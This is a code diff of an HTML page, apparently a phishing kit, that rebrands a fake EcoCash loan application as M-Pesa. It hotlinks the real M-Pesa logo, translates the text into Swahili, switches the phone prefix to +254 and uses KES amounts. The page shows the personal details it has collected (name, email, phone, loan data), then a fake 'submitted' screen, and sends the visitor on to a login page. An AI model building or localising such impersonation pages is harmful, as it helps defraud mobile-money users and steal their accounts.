@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash - Loan Application</title>
+    <title>M-Pesa - Loan Application</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
@@ -48,17 +48,16 @@
             color: #333;
         }
         
-        .logo {
-            font-size: 28px;
-            font-weight: 700;
+        .logo-link {
+            display: flex;
+            align-items: center;
+            text-decoration: none;
         }
         
-        .logo-eco {
-            color: #0066ff;
-        }
-        
-        .logo-cash {
-            color: #ff0000;
+        .mpesa-logo-img {
+            height: clamp(28px, 7vw, 36px);
+            width: auto;
+            display: block;
         }
         
         .card {
@@ -101,7 +100,7 @@
         .progress-fill {
             width: 100%;
             height: 100%;
-            background: linear-gradient(to right, #4361ee, #7209b7);
+            background: linear-gradient(to right, #00a82d, #007520);
         }
         
         .step-text {
@@ -127,8 +126,14 @@
             margin-bottom: 16px;
         }
         
+        .form-select:focus,
+        .form-input:focus {
+            border-color: #00a82d;
+            outline: none;
+        }
+        
         .summary-box {
-            background: #f8f9ff;
+            background: #eafaf1;
             padding: 16px;
             border-radius: 16px;
             font-size: 14px;
@@ -168,7 +173,7 @@
         }
         
         .submit-btn {
-            background: linear-gradient(to right, #4361ee, #7209b7);
+            background: linear-gradient(to right, #00a82d, #007520);
             color: white;
             position: relative;
         }
@@ -181,7 +186,20 @@
             width: 100%;
             max-width: 480px;
         }
-        /* Spinner Overlay - Transparent Bluish */
+        
+        .footer-mpesa {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 4px;
+        }
+        
+        .footer-mpesa img {
+            height: 18px;
+            width: auto;
+        }
+        /* Spinner Overlay - Transparent Greenish */
         
         #spinnerOverlay {
             position: fixed;
@@ -189,8 +207,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 102, 255, 0.15);
-            /* Transparent bluish */
+            background: rgba(0, 168, 45, 0.15);
             display: none;
             justify-content: center;
             align-items: center;
@@ -202,7 +219,7 @@
             width: 60px;
             height: 60px;
             border: 6px solid #f0f0f0;
-            border-top: 6px solid #0066ff;
+            border-top: 6px solid #00a82d;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 30px;
@@ -244,7 +261,7 @@
         .check-icon {
             width: 80px;
             height: 80px;
-            background: #00c853;
+            background: #00a82d;
             border-radius: 50%;
             display: flex;
             justify-content: center;
@@ -257,7 +274,7 @@
         .success-title {
             font-size: 24px;
             font-weight: 700;
-            color: #00c853;
+            color: #00a82d;
             margin-bottom: 15px;
         }
         
@@ -285,7 +302,7 @@
             width: 20px;
             height: 20px;
             border: 2px solid #f3f3f3;
-            border-top: 2px solid #0066ff;
+            border-top: 2px solid #00a82d;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -293,7 +310,7 @@
         .go-login-btn {
             width: 100%;
             padding: 16px;
-            background: #0066ff;
+            background: #00a82d;
             color: white;
             border: none;
             border-radius: 50px;
@@ -301,43 +318,54 @@
             font-weight: 700;
             cursor: pointer;
         }
+        
+        .go-login-btn:hover {
+            background: #008f26;
+        }
     </style>
 </head>
 
 <body>
     <header>
         <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
+        <a class="logo-link" href="#" aria-label="M-Pesa Home">
+            <img class="mpesa-logo-img" src="https://www.m-pesa.africa/images/mpesa-logo.png" alt="M-Pesa Logo">
+        </a>
         <div></div>
     </header>
 
     <main class="card">
         <div class="top">
-            <h1 class="form-title">Final Review</h1>
+            <h1 class="form-title">Kagua na Wasilisha</h1>
             <div class="progress-bar">
                 <div class="progress-fill"></div>
             </div>
-            <div class="step-text">Step 3 of 3</div>
-            <label class="form-label">Employment Status</label>
+            <div class="step-text">Hatua ya 3 kati ya 3</div>
+            <label class="form-label">Hali ya Ajira</label>
             <select class="form-select" id="employmentStatus">
-                <option>Employed</option>
-                <option>Self-Employed</option>
-                <option>Unemployed</option>
-                <option>Student</option>
+                <option>Mwenye Ajira</option>
+                <option>Mfanya Biashara</option>
+                <option>Bila Ajira</option>
+                <option>Mwanafunzi</option>
             </select>
-            <label class="form-label">Annual Income ($)</label>
-            <input type="number" class="form-input" id="annualIncome" placeholder="50000">
+            <label class="form-label">Mapato ya Mwaka (KES)</label>
+            <input type="number" class="form-input" id="annualIncome" placeholder="500000">
             <div class="summary-box" id="summaryBox">
                 <!-- Filled dynamically by JavaScript -->
             </div>
         </div>
         <div class="btn-group">
-            <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
-            <button class="submit-btn" id="submitBtn">SUBMIT APPLICATION</button>
+            <button class="prev-btn" onclick="history.back()">NYUMA</button>
+            <button class="submit-btn" id="submitBtn">WASILISHA OMBI</button>
         </div>
     </main>
-    <footer>© 2025 EcoCash</footer>
-    <!-- Spinner Overlay (Transparent Bluish) -->
+    <footer>
+        <div>© 2025 M-Pesa Loans</div>
+        <div class="footer-mpesa">
+            Powered by <img src="https://www.m-pesa.africa/images/mpesa-logo.png" alt="M-Pesa">
+        </div>
+    </footer>
+    <!-- Spinner Overlay (Transparent Greenish) -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
     </div>
@@ -345,27 +373,33 @@
     <div id="successOverlay">
         <div class="success-card">
             <div class="check-icon">✓</div>
-            <div class="success-title">Loan Application Submitted</div>
+            <div class="success-title">Ombi Limewasilishwa</div>
             <div class="success-msg">
-                Your loan application has been submitted. Please wait for approval.<br><br> You will receive a confirmation message. For now, proceed to EcoCash.
+                Ombi lako la mkopo limewasilishwa. Tafadhali subiri idhini.<br><br>
+                Utapokea ujumbe wa kuthibitisha. Kwa sasa, endelea kwa M-Pesa.
             </div>
             <div class="redirect-bar">
                 <div class="loader"></div>
-                Redirecting to EcoCash login in <span id="countdown">3</span>...
+                Inaelekeza kwa M-Pesa katika <span id="countdown">3</span>...
             </div>
-            <button class="go-login-btn" onclick="window.location.href='login.html'">Go to Login Now</button>
+            <button class="go-login-btn" onclick="window.location.href='login.html'">Nenda kwa M-Pesa Sasa</button>
         </div>
     </div>
     <script>
         const summaryBox = document.getElementById('summaryBox');
+
+        function formatKES(n) {
+            return 'KES ' + Number(n).toLocaleString('en-KE');
+        }
+
         summaryBox.innerHTML = `
-            <div class="summary-row"><span>Loan Type:</span><span class="summary-value">${localStorage.getItem('loanType') || 'Personal Loan'}</span></div>
-            <div class="summary-row"><span>Amount:</span><span class="summary-value">$${parseFloat(localStorage.getItem('loanAmount') || 5000).toLocaleString()}</span></div>
-            <div class="summary-row"><span>Term:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} Months</span></div>
-            <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Not specified'}</span></div>
-            <div class="summary-row"><span>Name:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
-            <div class="summary-row"><span>Email:</span><span class="summary-value">${localStorage.getItem('email') || 'N/A'}</span></div>
-            <div class="summary-row"><span>Phone:</span><span class="summary-value">+263 ${localStorage.getItem('phone') || 'N/A'}</span></div>
+            <div class="summary-row"><span>Aina ya Mkopo:</span><span class="summary-value">${localStorage.getItem('loanType') || 'Mkopo wa Kibinafsi'}</span></div>
+            <div class="summary-row"><span>Kiasi:</span><span class="summary-value">${formatKES(parseFloat(localStorage.getItem('loanAmount') || 500000))}</span></div>
+            <div class="summary-row"><span>Muda:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} Months</span></div>
+            <div class="summary-row"><span>Sababu:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Haijaelezwa'}</span></div>
+            <div class="summary-row"><span>Jina:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
+            <div class="summary-row"><span>Barua Pepe:</span><span class="summary-value">${localStorage.getItem('email') || 'N/A'}</span></div>
+            <div class="summary-row"><span>Simu:</span><span class="summary-value">+254 ${localStorage.getItem('phone') || 'N/A'}</span></div>
         `;
         if (localStorage.getItem('employmentStatus')) {
             document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
@@ -376,12 +410,12 @@
         document.getElementById('submitBtn').addEventListener('click', function() {
             const income = document.getElementById('annualIncome').value.trim();
             if (!income || income < 1000) {
-                alert('Please enter a valid annual income (minimum $1,000).');
+                alert('Tafadhali ingiza mapato halali ya mwaka (kiwango cha chini KES 1,000).');
                 return;
             }
             localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
             localStorage.setItem('annualIncome', income);
-            // Show transparent bluish spinner for 3 seconds
+            // Show transparent greenish spinner for 3 seconds
             const spinnerOverlay = document.getElementById('spinnerOverlay');
             spinnerOverlay.style.display = 'flex';
             setTimeout(() => {
